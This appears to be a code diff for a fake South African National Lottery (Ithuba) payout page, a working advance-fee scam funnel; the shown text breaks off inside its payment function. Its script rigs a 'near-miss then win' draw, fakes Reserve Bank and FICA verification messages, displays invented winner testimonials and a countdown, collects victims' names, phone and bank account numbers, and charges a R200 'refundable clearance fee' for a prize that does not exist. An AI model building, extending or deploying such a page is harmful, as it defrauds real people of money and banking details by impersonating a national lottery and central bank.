+            PowerBall #5 landed on <b id="nmBallDrawn" style="color:#ffe100;">08</b> and you picked <b id="nmBallPicked" style="color:#ffe100;">07</b>! Your RICA mobile number unlocked <b>1 FINAL SECOND-CHANCE BONUS SPIN</b>. Tap your lucky number below now!
+          </p>
+        </div>
+
+        <!-- Official Circular Number Grid (.number-grid & .lotto-number) -->
+        <div id="numberBoardWrap">
+          <div id="numberGrid" class="number-grid">
+            <!-- 01 to 15 -->
+          </div>
+        </div>
+
+        <!-- WINNER CONFIRMATION BOX (Appears on 2nd spin match!) -->
+        <div id="winConfirmBox" class="hidden" style="background:rgba(0,150,57,0.28);border:2px solid #ffe100;border-radius:14px;padding:16px;text-align:center;">
+          <div style="display:inline-block;background:#ffe100;color:#1a1a1a;font-size:10px;font-weight:900;padding:3px 10px;border-radius:999px;text-transform:uppercase;">
+            OFFICIAL POWERBALL MATCH CONFIRMED
+          </div>
+          <h3 class="font-urbanist-black" style="font-size:20px;color:#fff;margin-top:8px;">
+            CONGRATULATIONS, <span id="winUserName">WINNER</span>!
+          </h3>
+          <p style="font-size:12px;color:rgba(255,255,255,0.9);margin-top:3px;">
+            Your PowerBall <b id="winBallNumber" style="color:#ffe100;">#07</b> matched! Your pending payout has been credited to your wallet:
+          </p>
+          <div class="font-urbanist-black dynamic-prize-text" style="font-size:32px;color:#ffe100;margin:8px 0;">
+            R 16,299.00
+          </div>
+          <button onclick="goToBankSelection()" class="ithuba-btn-primary">
+            <span>SELECT MY SA BANK FOR INSTANT EFT →</span>
+          </button>
+        </div>
+      </section>
+    </div>
+
+    <!-- =========================================================
+         STEP 4: REAL SOUTH AFRICAN BANK LOGOS + ACCOUNT INPUT
+         ========================================================= -->
+    <div id="step-bank" class="hidden">
+      <section class="game-list-card">
+        <div style="display:flex;justify-content:space-between;align-items:center;">
+          <span style="font-size:11px;font-weight:800;color:#ffe100;text-transform:uppercase;">STEP 3: BANK PAYOUT ROUTING</span>
+          <span class="dynamic-prize-text" style="background:#009639;color:#fff;font-size:11px;font-weight:800;padding:2px 9px;border-radius:999px;">R 16,299.00</span>
+        </div>
+
+        <h3 class="font-urbanist-bold" style="font-size:17px;">
+          Select your South African Bank for Instant PayShap / RTC Deposit:
+        </h3>
+
+        <!-- REAL SOUTH AFRICAN BANK LOGOS GRID -->
+        <div id="realBanksGrid" class="sa-bank-grid">
+          <!-- Populated by JS with real SVG bank logos -->
+        </div>
+
+        <label class="w-field-label">Account Holder Full Name</label>
+        <input id="inpAccountHolder" type="text" class="w-field" oninput="validateBankStep()" />
+
+        <label class="w-field-label">Bank Account Number (or Capitec Cellphone Account)</label>
+        <input id="inpAccountNum" type="text" inputmode="numeric" class="w-field" placeholder="e.g. 1482930411" oninput="validateBankStep()" />
+
+        <button id="btnVerifyBank" disabled onclick="startBankVerification()" class="ithuba-btn-primary">
+          <span>VERIFY BANK ACCOUNT &amp; PREPARE PAYOUT →</span>
+        </button>
+      </section>
+    </div>
+
+    <!-- =========================================================
+         STEP 5: SARB / FICA REAL-TIME CLEARING
+         ========================================================= -->
+    <div id="step-clearing" class="hidden">
+      <section class="game-list-card" style="text-align:center;padding:24px 16px;">
+        <div style="width:48px;height:48px;border:4px solid rgba(255,255,255,0.2);border-top-color:#ffe100;border-radius:50%;margin:0 auto 12px;animation:spin 0.8s linear infinite;"></div>
+        <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
+        <h3 class="font-urbanist-black" style="font-size:17px;color:#ffe100;">
+          CONNECTING TO SOUTH AFRICAN RESERVE BANK (SARB)
+        </h3>
+        <p id="clearingStatusLine" style="font-size:12px;color:rgba(255,255,255,0.85);margin-top:4px;">
+          Verifying banking details...
+        </p>
+        <div id="clearingStepsBox" style="margin-top:14px;text-align:left;background:rgba(0,0,0,0.35);border-radius:12px;padding:12px;font-size:11.5px;line-height:1.8;color:#6ee7a0;">
+        </div>
+      </section>
+    </div>
+
+    <!-- =========================================================
+         STEP 6: EFT NOTICE DIALOG (PRE-VSL APPROVAL SCREEN)
+         ========================================================= -->
+    <div id="step-approved" class="hidden">
+      <section class="game-list-card" style="text-align:center;">
+        <div style="display:inline-block;background:#009639;color:#fff;font-size:10px;font-weight:800;padding:3px 10px;border-radius:999px;margin:0 auto;text-transform:uppercase;">
+          ✓ SARB &amp; FICA ACCOUNT VERIFIED
+        </div>
+
+        <h2 class="font-urbanist-black" style="font-size:20px;color:#ffe100;margin-top:6px;">
+          PAYOUT APPROVED FOR RELEASE
+        </h2>
+
+        <!-- Selected Bank Card Preview -->
+        <div style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,225,0,0.45);border-radius:12px;padding:12px;display:flex;align-items:center;justify-content:space-between;gap:10px;text-align:left;">
+          <div style="display:flex;align-items:center;gap:10px;">
+            <img id="apprBankLogo" src="images/banks/capitec.svg" alt="Bank" style="width:92px;height:30px;object-fit:contain;border-radius:5px;" />
+            <div>
+              <div id="apprBankTitle" style="font-size:12px;font-weight:800;color:#fff;">Capitec Bank</div>
+              <div id="apprAccMask" style="font-size:11px;color:rgba(255,255,255,0.75);">Acct: •••• 4829</div>
+            </div>
+          </div>
+          <div style="text-align:right;">
+            <div style="font-size:9px;color:rgba(255,255,255,0.7);text-transform:uppercase;">Net Amount</div>
+            <div class="font-urbanist-black dynamic-prize-text" style="font-size:16px;color:#ffe100;">R 16,299.00</div>
+          </div>
+        </div>
+
+        <div style="background:rgba(255,101,12,0.22);border:1px solid #ff650c;border-radius:12px;padding:12px;text-align:left;">
+          <div style="font-size:11.5px;font-weight:800;color:#ffe100;text-transform:uppercase;">
+            FINAL STEP TO RELEASE YOUR <span class="dynamic-prize-text">R 16,299.00</span>:
+          </div>
+          <p style="font-size:12px;color:rgba(255,255,255,0.9);margin-top:4px;line-height:1.45;">
+            Watch the brief <b>official payout instruction video</b> on the next screen to authorize and release your <b class="dynamic-prize-text" style="color:#ffe100;">R 16,299.00</b> transfer immediately.
+          </p>
+        </div>
+
+        <button onclick="openVslStep()" class="ithuba-btn-primary">
+          <span>▶ WATCH PAYOUT BRIEFING TO RECEIVE NOW</span>
+        </button>
+      </section>
+    </div>
+
+    <!-- =========================================================
+         STEP 7: VSL BROADCAST + PENDING BALANCE + DIRECT INLINE API POPUP PAYMENT
+         ========================================================= -->
+    <div id="step-vsl" class="hidden">
+
+      <!-- Pending Payout Balance + Urgency Timer + Selected Bank Logo Card -->
+      <section class="game-list-card" style="padding:13px 14px;">
+        <div class="pending-balance-hero">
+          <div style="display:flex;align-items:center;justify-content:space-between;gap:6px;">
+            <span style="background:rgba(255,101,12,0.25);border:1px solid #ff650c;color:#ffe100;font-size:9.5px;font-weight:800;padding:2px 8px;border-radius:999px;text-transform:uppercase;">
+              ⏳ PENDING FICA RELEASE
+            </span>
+            <div style="display:flex;align-items:center;gap:5px;">
+              <span style="font-size:10px;color:rgba(255,255,255,0.8);">Expires in:</span>
+              <span id="vslCountdown" class="countdown-unit" style="background:#e30613;color:#fff;">04:59</span>
+            </div>
+          </div>
+
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-top:10px;">
+            <div>
+              <div style="font-size:10px;color:rgba(255,255,255,0.75);text-transform:uppercase;font-weight:700;">Pending Wallet Payout</div>
+              <div class="font-urbanist-black dynamic-prize-text" style="font-size:28px;color:#ffe100;line-height:1.1;">R 16,299.00</div>
+            </div>
+            <div style="text-align:right;">
+              <img id="vslBankLogo" src="images/banks/capitec.svg" alt="Bank" style="width:90px;height:28px;object-fit:contain;border-radius:5px;margin-left:auto;" />
+              <div id="vslBeneficiaryText" style="font-size:10.5px;font-weight:700;color:#fff;margin-top:2px;">Verified Beneficiary</div>
+            </div>
+          </div>
+
+          <div style="display:flex;justify-content:space-between;font-size:10.5px;font-weight:700;margin-top:8px;color:#6ee7a0;">
+            <span>⚡ PayShap / RTC Transfer: 92% Complete (Awaiting R200 Release)</span>
+            <span>92%</span>
+          </div>
+          <div class="escrow-progress-track">
+            <div class="escrow-progress-fill"></div>
+          </div>
+        </div>
+      </section>
+
+      <!-- VSL Player Card -->
+      <section class="game-list-card" style="padding:12px;">
+        <div style="display:flex;justify-content:space-between;align-items:center;">
+          <span style="font-size:11px;font-weight:800;color:#ffe100;text-transform:uppercase;">OFFICIAL ITHUBA PAYOUT BRIEFING</span>
+          <span style="font-size:10.5px;color:rgba(255,255,255,0.8);">3,542 watching</span>
+        </div>
+
+        <div style="background:#000;border-radius:12px;overflow:hidden;min-height:220px;">
+          <div id="vturbContainer"></div>
+        </div>
+      </section>
+
+      <!-- Verified SA Winners with Real Bank Logos -->
+      <section class="game-list-card">
+        <div style="display:flex;justify-content:space-between;align-items:center;">
+          <span class="font-urbanist-bold" style="font-size:14px;color:#ffe100;">RECENT VERIFIED PAYOUTS TODAY</span>
+          <span style="font-size:10px;color:#6ee7a0;font-weight:700;">✓ Live SARB Feed</span>
+        </div>
+        <div id="verifiedWinnersList" style="display:flex;flex-direction:column;gap:10px;">
+          <!-- Rendered with real bank logos -->
+        </div>
+      </section>
+
+    </div>
+
+    <!-- =========================================================
+         STEP 8: IN-PAGE PAYMENT APPROVED CONFIRMATION (NO REDIRECT)
+         ========================================================= -->
+    <div id="step-paid-success" class="hidden">
+      <section class="game-list-card" style="text-align:center;padding:24px 18px;">
+        <div style="display:inline-block;background:#009639;color:#fff;font-size:11px;font-weight:800;padding:4px 12px;border-radius:999px;margin:0 auto;">
+          ✓ FICA CLEARANCE COMPLETED
+        </div>
+        <h2 class="font-urbanist-black" style="font-size:22px;color:#ffe100;margin-top:8px;">
+          YOUR R 16,499.00 ZAR PAYOUT IS DISPATCHED!
+        </h2>
+        <p style="font-size:12.5px;color:rgba(255,255,255,0.9);margin-top:6px;line-height:1.5;">
+          Your R 200.00 clearance fee has been verified and reimbursed. Your full net payout of <b style="color:#ffe100;">R 16,499.00 ZAR</b> is now clearing to your bank account via SARB Real-Time Clearing.
+        </p>
+      </section>
+    </div>
+
+  </main>
+
+  <!-- LIVE PAYOUT TOAST WITH REAL BANK LOGO -->
+  <div id="liveToast" class="payout-toast">
+    <img id="toastBankLogo" src="images/banks/capitec.svg" alt="Bank" />
+    <div style="font-size:11px;line-height:1.3;">
+      <div id="toastUser" style="font-weight:800;color:#ffe100;">Sipho Dlamini (Soweto)</div>
+      <div id="toastMsg" style="color:#fff;">Received <b>R 16,299.00</b> via Instant PayShap</div>
+    </div>
+  </div>
+
+  <!-- INLINE CREAPAY / PAYSTACK LIGHTBOX POPUP MODAL (ZERO REDIRECT FALLBACK) -->
+  <div class="creapay-modal-overlay" id="creaPayModal" style="display:none;" onclick="handleModalBackdropClick(event)">
+    <div class="creapay-modal-container" onclick="event.stopPropagation()">
+      <div class="creapay-modal-header">
+        <div>
+          <div style="font-size:13px;font-weight:800;">Ithuba &amp; SARB Instant Settlement</div>
+          <div style="font-size:10px;opacity:0.9;">Pay R 200.00 (100% Refunded) to Release R 16,499.00 ZAR</div>
+        </div>
+        <button type="button" class="modal-close-icon" onclick="closeInlineModal()">&times;</button>
+      </div>
+      <div id="modalIframeLoader" style="padding:14px;text-align:center;font-size:12px;color:#ffe100;background:#111;">
+        Connecting to Secure Paystack / SARB Switch...
+      </div>
+      <div class="creapay-iframe-wrapper">
+        <iframe id="creaPayFrame" src="about:blank" allow="payment; camera; microphone"></iframe>
+      </div>
+    </div>
+  </div>
+
+  <!-- OFFICIAL FROSTED BOTTOM NAVIGATION BAR FROM nationallottery.co.za -->
+  <nav class="bottom-nav">
+    <div class="nav-item active">
+      <img src="images/ithuba/h5_R1.png" alt="Home" />
+      <span class="nav-text">Home</span>
+    </div>
+    <div class="nav-item">
+      <img src="images/ithuba/h5_I1.png" alt="Games" />
+      <span class="nav-text">Play Now</span>
+    </div>
+    <div class="nav-item">
+      <img src="images/ithuba/h5_b1.png" alt="Results" />
+      <span class="nav-text">Results</span>
+    </div>
+    <div class="nav-item">
+      <img src="images/ithuba/h5_Q1.png" alt="Wallet" />
+      <span class="nav-text">Payouts</span>
+    </div>
+  </nav>
+
+  <!-- UNIFIED FUNNEL + DIRECT API INLINE PAYMENT SCRIPT -->
+  <script>
+    const STATE = {
+      prizeAmount: 16299,
+      prizeLabel: "R 16,299.00",
+      feeAmount: 200,
+      feeLabel: "R 200.00",
+      voucherRef: "ZA-ITH-2026-" + Math.floor(100000 + Math.random() * 900000),
+      name: "",
+      phone: "",
+      selectedGameIdx: 0,
+      spinsLeft: 2,
+      pickedNum: null,
+      bankName: "Capitec Bank",
+      bankLogo: "images/banks/capitec.svg",
+      accountHolder: "",
+      accountNumber: ""
+    };
+
+    const OFFICIAL_GAMES = [
+      { name: "POWERBALL PLUS", logo: "images/ithuba/powerball_logo.png", pool: "R 150,000,000" },
+      { name: "LOTTO PLUS 1", logo: "images/ithuba/lotto_logo.png", pool: "R 60,000,000" },
+      { name: "DAILY LOTTO", logo: "images/ithuba/dailylotto_logo.png", pool: "R 15,000,000" }
+    ];
+
+    const SA_BANKS = [
+      { name: "Capitec Bank", logo: "images/banks/capitec.svg" },
+      { name: "FNB", logo: "images/banks/fnb.svg" },
+      { name: "Standard Bank", logo: "images/banks/standard_bank.svg" },
+      { name: "ABSA Bank", logo: "images/banks/absa.svg" },
+      { name: "Nedbank", logo: "images/banks/nedbank.svg" },
+      { name: "TymeBank", logo: "images/banks/tymebank.svg" },
+      { name: "African Bank", logo: "images/banks/african_bank.svg" },
+      { name: "Discovery Bank", logo: "images/banks/discovery_bank.svg" }
+    ];
+
+    const WINNER_REVIEWS = [
+      { name: "Thandi Ngwenya", city: "Johannesburg", bank: "Capitec Bank", logo: "images/banks/capitec.svg", time: "12m ago", text: "Paid the R97 refundable FICA clearance fee right here on the popup and within 4 minutes my Capitec app notified me: R16,396.00 deposited! Thank you Ithuba!" },
+      { name: "Sipho Mkhize", city: "Durban", bank: "FNB", logo: "images/banks/fnb.svg", time: "29m ago", text: "Missed by 1 number on my 1st spin, then hit the red PowerBall on my 2nd spin! Authorized the R97 fee and FNB cleared my payout immediately." },
+      { name: "Zanele Dlamini", city: "Pretoria", bank: "TymeBank", logo: "images/banks/tymebank.svg", time: "1h ago", text: "Everything happens right on the screen without leaving the National Lottery portal. My TymeBank reflected the full tax-free amount today." },
+      { name: "Mandla Nkosi", city: "Soweto", bank: "Standard Bank", logo: "images/banks/standard_bank.svg", time: "2h ago", text: "Fastest payout ever via PayShap. Make sure your account number is typed correctly!" }
+    ];
+
+    // Capture UTMs on page load
+    window.addEventListener("DOMContentLoaded", () => {
+      const params = new URLSearchParams(window.location.search);
+      ["utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term", "fbclid"].forEach(k => {
+        const val = params.get(k);
+        if (val) {
+          try {
+            sessionStorage.setItem("_sa_" + k, val);
+            localStorage.setItem("_sa_" + k, val);
+          } catch(e){}
+        }
+      });
+    });
+
+    let audioCtx = null;
+    function playSound(freq, dur, type = "sine", vol = 0.08) {
+      try {
+        if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const o = audioCtx.createOscillator();
+        const g = audioCtx.createGain();
+        o.type = type;
+        o.frequency.setValueAtTime(freq, audioCtx.currentTime);
+        g.gain.setValueAtTime(vol, audioCtx.currentTime);
+        g.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + dur);
+        o.connect(g);
+        g.connect(audioCtx.destination);
+        o.start();
+        o.stop(audioCtx.currentTime + dur);
+      } catch(e){}
+    }
+
+    function playJackpotSound() {
+      [523, 659, 784, 1046].forEach((f, i) => setTimeout(() => playSound(f, 0.25, "triangle", 0.14), i * 115));
+    }
+
+    function closeAgeModal() {
+      playSound(640, 0.1);
+      document.getElementById("ageModal").classList.add("hidden");
+    }
+
+    function nextQuestion(q) {
+      playSound(600 + q * 80, 0.1);
+      if (q === 1) {
+        document.getElementById("qBox1").classList.add("hidden");
+        document.getElementById("qBox2").classList.remove("hidden");
+        document.getElementById("qBadge").textContent = "Question 2 of 3";
+      } else if (q === 2) {
+        document.getElementById("qBox2").classList.add("hidden");
+        document.getElementById("qBox3").classList.remove("hidden");
+        document.getElementById("qBadge").textContent = "Question 3 of 3";
+      } else {
+        showStep("step-register");
+        renderOfficialGames();
+      }
+    }
+
+    function renderOfficialGames() {
+      const container = document.getElementById("officialGamesList");
+      container.innerHTML = OFFICIAL_GAMES.map((g, i) => {
+        const active = STATE.selectedGameIdx === i;
+        return `
+          <div onclick="selectGame(${i})" class="pm-option ${active ? 'active' : ''}" style="margin-bottom:0;">
+            <div style="display:flex;align-items:center;gap:10px;">
+              <span class="pm-radio-dot"></span>
+              <img src="${g.logo}" alt="${g.name}" style="height:28px;width:95px;object-fit:contain;object-position:left center;" />
+            </div>
+            <div style="text-align:right;">
+              <div style="font-size:10px;color:rgba(255,255,255,0.7);">Jackpot Pool</div>
+              <div class="font-urbanist-black" style="font-size:15px;color:#ffe100;">${g.pool}</div>
+            </div>
+          </div>
+        `;
+      }).join("");
+    }
+
+    function selectGame(idx) {
+      playSound(620, 0.08);
+      STATE.selectedGameIdx = idx;
+      renderOfficialGames();
+    }
+
+    function validateReg() {
+      const n = document.getElementById("inpName").value.trim();
+      const p = document.getElementById("inpPhone").value.replace(/\D/g, "");
+      STATE.name = n;
+      STATE.phone = p;
+      document.getElementById("btnStartDraw").disabled = !(n.length >= 2 && p.length >= 9);
+    }
+
+    function goToDrawStep() {
+      playSound(740, 0.12);
+      document.getElementById("tabStep1").classList.remove("type-select");
+      document.getElementById("tabStep2").classList.add("type-select");
+      document.getElementById("drawPoolLogo").src = OFFICIAL_GAMES[STATE.selectedGameIdx].logo;
+      showStep("step-draw");
+      renderDrawnBalls([null, null, null, null, null]);
+      renderNumberGrid(false);
+    }
+
+    function renderDrawnBalls(balls) {
+      const row = document.getElementById("drawnBallsRow");
+      row.innerHTML = balls.map((b, i) => {
+        if (b === null) {
+          return `<div class="drawn-ball-slot drawn-ball-empty">?</div>`;
+        }
+        const s = String(b).padStart(2, "0");
+        const cls = i === 4 ? "drawn-ball-red" : "drawn-ball-yellow";
+        return `<div class="drawn-ball-slot ${cls}">${s}</div>`;
+      }).join("");
+    }
+
+    function renderNumberGrid(disabled) {
+      const grid = document.getElementById("numberGrid");
+      const nums = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15];
+      grid.innerHTML = nums.map(n => {
+        const s = String(n).padStart(2, "0");
+        const sel = STATE.pickedNum === n ? "lotto-number--selected" : "";
+        return `<button type="button" ${disabled ? 'disabled' : ''} onclick="spinNumber(${n})" class="lotto-number ${sel}">${s}</button>`;
+      }).join("");
+    }
+
+    function spinNumber(picked) {
+      STATE.pickedNum = picked;
+      renderNumberGrid(true);
+      document.getElementById("nearMissAlert").classList.add("hidden");
+      const pickedStr = String(picked).padStart(2, "0");
+      document.getElementById("drawHeadline").textContent = `Drawing 5 Official Balls for Your Lucky Number #${pickedStr}...`;
+
+      const isFirst = STATE.spinsLeft === 2;
+      const neighbor = picked < 15 ? picked + 1 : picked - 1;
+      const others = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15].filter(x => x !== picked && x !== neighbor).sort(() => 0.5 - Math.random()).slice(0, 4);
+      const fifth = isFirst ? neighbor : picked;
+      const seq = [...others, fifth];
+      const current = [null, null, null, null, null];
+
+      seq.forEach((val, idx) => {
+        setTimeout(() => {
+          current[idx] = val;
+          playSound(420 + idx * 95, 0.11, "triangle", 0.11);
+          renderDrawnBalls(current);
+
+          if (idx === 4) {
+            setTimeout(() => {
+              if (isFirst) {
+                STATE.spinsLeft = 1;
+                playSound(230, 0.3, "sawtooth", 0.09);
+                document.getElementById("spinsRemainingBadge").textContent = "1 Bonus Spin Left";
+                document.getElementById("nmBallDrawn").textContent = "#" + String(fifth).padStart(2, "0");
+                document.getElementById("nmBallPicked").textContent = "#" + pickedStr;
+                document.getElementById("nearMissAlert").classList.remove("hidden");
+                document.getElementById("drawHeadline").textContent = "Second-Chance Bonus Activated — Tap Your Number Again!";
+                renderNumberGrid(false);
+              } else {
+                playJackpotSound();
+                document.getElementById("spinsRemainingBadge").textContent = "POWERBALL MATCH!";
+                document.getElementById("spinsRemainingBadge").style.background = "#009639";
+                document.getElementById("headerWalletValue").textContent = STATE.prizeLabel;
+                document.getElementById("headerWalletBadge").textContent = "PENDING EFT";
+                document.getElementById("headerWalletBadge").style.background = "#009639";
+                document.getElementById("numberBoardWrap").classList.add("hidden");
+                document.getElementById("winUserName").textContent = (STATE.name || "WINNER").split(" ")[0].toUpperCase();
+                document.getElementById("winBallNumber").textContent = "#" + pickedStr;
+                document.getElementById("winConfirmBox").classList.remove("hidden");
+              }
+            }, 500);
+          }
+        }, 600 + idx * 700);
+      });
+    }
+
+    function goToBankSelection() {
+      playSound(700, 0.12);
+      document.getElementById("tabStep2").classList.remove("type-select");
+      document.getElementById("tabStep3").classList.add("type-select");
+      showStep("step-bank");
+      document.getElementById("inpAccountHolder").value = STATE.name || "Thabo Mokoena";
+      STATE.accountHolder = document.getElementById("inpAccountHolder").value;
+      renderRealBanks();
+    }
+
+    function renderRealBanks() {
+      const g = document.getElementById("realBanksGrid");
+      g.innerHTML = SA_BANKS.map((b, idx) => {
+        const active = STATE.bankName === b.name;
+        return `
+          <div onclick="chooseBank(${idx})" class="sa-bank-card ${active ? 'active' : ''}">
+            <img src="${b.logo}" alt="${b.name}" />
+            <span>${b.name}</span>
+          </div>
+        `;
+      }).join("");
+    }
+
+    function chooseBank(idx) {
+      playSound(620, 0.08);
+      STATE.bankName = SA_BANKS[idx].name;
+      STATE.bankLogo = SA_BANKS[idx].logo;
+      renderRealBanks();
+      validateBankStep();
+    }
+
+    function validateBankStep() {
+      const h = document.getElementById("inpAccountHolder").value.trim();
+      const a = document.getElementById("inpAccountNum").value.replace(/\D/g, "");
+      STATE.accountHolder = h;
+      STATE.accountNumber = a;
+      document.getElementById("btnVerifyBank").disabled = !(h.length >= 2 && a.length >= 6);
+    }
+
+    function startBankVerification() {
+      playSound(760, 0.14);
+      showStep("step-clearing");
+      const lines = [
+        `✓ Connected to ${STATE.bankName} Instant PayShap Switch`,
+        `✓ Verified Account ••••${(STATE.accountNumber || "4829").slice(-4)} (${STATE.accountHolder})`,
+        `✓ SARB Tax-Free Restitution Directive #ZA-8841 Confirmed`,
+        `✓ Allocated ${STATE.prizeLabel} for Immediate Release`
+      ];
+      const box = document.getElementById("clearingStepsBox");
+      box.innerHTML = "";
+      lines.forEach((l, i) => {
+        setTimeout(() => {
+          playSound(520 + i * 90, 0.09);
+          document.getElementById("clearingStatusLine").textContent = l;
+          box.innerHTML += `<div>${l}</div>`;
+          if (i === lines.length - 1) {
+            setTimeout(() => showApprovedDialog(), 850);
+          }
+        }, i * 950);
+      });
+    }
+
+    function showApprovedDialog() {
+      playJackpotSound();
+      if (window.fbq) fbq('track', 'Lead', { content_name: 'Ithuba Payout Approved', value: STATE.prizeAmount, currency: 'ZAR' });
+      showStep("step-approved");
+      document.getElementById("apprBankLogo").src = STATE.bankLogo;
+      document.getElementById("apprBankTitle").textContent = STATE.bankName;
+      document.getElementById("apprAccMask").textContent = "Acct: •••• " + (STATE.accountNumber || "4829").slice(-4);
+    }
+
+    let vslTimerActive = false;
+    function openVslStep() {
+      playSound(800, 0.15);
+      showStep("step-vsl");
+      if (window.Track) window.Track.funnel('quiz_completed_vsl_opened', { bank: STATE.bankName || '' });
+      document.getElementById("vslBankLogo").src = STATE.bankLogo;
+      document.getElementById("vslBeneficiaryText").textContent = `${STATE.accountHolder || STATE.name || "Verified Winner"} (••••${(STATE.accountNumber || "4829").slice(-4)})`;
+      mountVturbPlayer();
+      renderVerifiedReviews();
+      if (!vslTimerActive) {
+        vslTimerActive = true;
+        let s = 299;
+        setInterval(() => {
+          if (s > 0) s--;
+          const m = String(Math.floor(s / 60)).padStart(2, "0");
+          const sec = String(s % 60).padStart(2, "0");
+          document.getElementById("vslCountdown").textContent = `${m}:${sec}`;
+        }, 1000);
+      }
+    }
+
+    let vturbMounted = false;
+    function mountVturbPlayer() {
+      if (vturbMounted) return;
+      vturbMounted = true;
+      const box = document.getElementById("vturbContainer");
+      if (!box) return;
+      box.innerHTML = '<vturb-smartplayer id="vid-6aee0dee1822ce961727695a" style="display: block; margin: 0 auto; width: 100%;"><div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 50% 0 0; z-index: 0; background-color: black;"></div></vturb-smartplayer>';
+      const sid = "vturb-s-6aee0dee1822ce961727695a";
+      if (!document.getElementById(sid)) {
+        const s = document.createElement("script");
+        s.id = sid;
+        s.src = "https://scripts.converteai.net/a896753d-a6a1-4988-8b70-2bb0ce504b42/players/6aee0dee1822ce961727695a/v4/player.js";
+        s.async = true;
+        document.head.appendChild(s);
+      }
+    }
+
+    function renderVerifiedReviews() {
+      const list = document.getElementById("verifiedWinnersList");
+      list.innerHTML = WINNER_REVIEWS.map(r => `
+        <div style="background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.16);border-radius:12px;padding:11px;">
+          <div style="display:flex;justify-content:space-between;align-items:center;gap:8px;">
+            <div>
+              <div style="font-size:12px;font-weight:800;color:#ffe100;">${r.name} • <span style="color:rgba(255,255,255,0.75);font-weight:600;">${r.city}</span></div>
+              <div style="font-size:10px;color:#6ee7a0;font-weight:700;">✓ Verified Payout • ${r.time}</div>
+            </div>
+            <img src="${r.logo}" alt="${r.bank}" style="width:74px;height:24px;object-fit:contain;border-radius:4px;" />
+          </div>
+          <p style="font-size:11.5px;color:rgba(255,255,255,0.9);margin-top:6px;line-height:1.4;">"${r.text}"</p>
+        </div>
+      `).join("");
+    }
+
+    // =========================================================================
+    // REDIRECT TO DEDICATED OFFICIAL ITHUBA CHECKOUT PAGE
+    // Pushes all winner details, bank, prize, and UTM parameters
+    // =========================================================================
+    function redirectToOfficialCheckout() {
+      playSound(740, 0.12);
+      if (window.fbq) {
+        fbq("track", "InitiateCheckout", {
+          content_name: "Statutory RICA Clearance Fee",
+          currency: "ZAR",
+          value: 200.00
+        });
+      }
+
+      const p = new URLSearchParams(window.location.search);
+      ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'sck', 'fbclid'].forEach(function(k) {
+        if (!p.get(k)) {
+          const v = sessionStorage.getItem('_sa_' + k) || localStorage.getItem('_sa_' + k) || sessionStorage.getItem(k) || localStorage.getItem(k);
+          if (v) p.set(k, v);
+        }
+      });
+      const name = STATE.accountHolder || STATE.name || "";
+      const phone = STATE.phone || "";
+      const bank = STATE.bankName || STATE.bank || "Capitec Bank";
+      const acc = STATE.accountNumber || "";
+      const prize = STATE.prize || 16299;
+
+      if (name) p.set("name", name);
+      if (phone) p.set("phone", phone);
+      if (bank) p.set("bank", bank);
+      if (acc) p.set("account", acc);
+      p.set("amount", prize);
+      p.set("fee", "200");
+      if (!p.get("ref")) {
+        p.set("ref", STATE.voucherRef || ("ITH-" + Math.floor(100000 + Math.random() * 900000)));
+      }
+
+      try {
+        localStorage.setItem("ithuba_winner_name", name);
+        localStorage.setItem("ithuba_winner_phone", phone);
+        localStorage.setItem("ithuba_winner_bank", bank);
+        localStorage.setItem("ithuba_winner_prize", prize);
+      } catch(e) {}
+
+      if (window.Track) window.Track.funnel('proceed_to_checkout_clicked', { bank: bank, amount: prize });
+
+      window.location.href = "checkout_paystack_refund_r97.html?" + p.toString();
+    }
+
+    // =========================================================================
+    // DIRECT API + INLINE POPUP PAYMENT ENGINE (ZERO REDIRECT!)
+    // Calls api/create-order.php and opens CreaPay.pay() inline popup directly
+    // =========================================================================
+    async function triggerInlineApiPayment() {
+      playSound(740, 0.12);
+
+      const custName = STATE.accountHolder || STATE.name || "Citizen Beneficiary";
+      const custPhone = STATE.phone || "0821234567";
+      const rawPhone = custPhone.replace(/[^0-9]/g, "") || "0821234567";
+      const custEmail = "citizen." + rawPhone + "@gmail.com";
+
+      if (window.fbq) {
+        fbq("track", "InitiateCheckout", { value: 200.00, currency: "ZAR" });
+        fbq("track", "AddPaymentInfo", { content_name: "Ithuba FICA Clearance Fee", currency: "ZAR", value: 200.00 });
+      }
+
+      const btn = document.getElementById("inlinePayButton");
+      const originalHtml = btn.innerHTML;
+      btn.innerHTML = `<span class="btn-main-title">OPENING SECURE PAYMENT POPUP...</span>`;
+      btn.disabled = true;
+
+      const capturedUtms = {
+        utm_source: sessionStorage.getItem("_sa_utm_source") || localStorage.getItem("_sa_utm_source") || "",
+        utm_medium: sessionStorage.getItem("_sa_utm_medium") || localStorage.getItem("_sa_utm_medium") || "",
+        utm_campaign: sessionStorage.getItem("_sa_utm_campaign") || localStorage.getItem("_sa_utm_campaign") || "",
+        utm_content: sessionStorage.getItem("_sa_utm_content") || localStorage.getItem("_sa_utm_content") || "",
+        utm_term: sessionStorage.getItem("_sa_utm_term") || localStorage.getItem("_sa_utm_term") || "",
+        fbclid: sessionStorage.getItem("_sa_fbclid") || localStorage.getItem("_sa_fbclid") || ""
+      };
+
+      const apiOrderUrl = window.location.pathname.includes("/restitution") ? "/restitution/api/create-order.php" : "api/create-order.php";
+      const recordSaleUrl = window.location.pathname.includes("/restitution") ? "/restitution/api/record-sale.php" : "api/record-sale.php";
+
+      const handlePaymentCompleted = function(orderIdStr) {
+        try {
+          if (window.fbq) fbq("track", "Purchase", { value: 200.00, currency: "ZAR" });
+          fetch(recordSaleUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              order_id: orderIdStr || STATE.voucherRef,
+              amount: 200.00,
+              name: custName,
+              email: custEmail,
+              phone: custPhone,
+              bank: STATE.bankName,
+              utms: capturedUtms
+            }),
+            keepalive: true
+          });
+        } catch(e){}
+        closeInlineModal();
+        document.getElementById("headerWalletBadge").textContent = "DISPATCHED";
+        showStep("step-paid-success");
+      };
+
+      try {
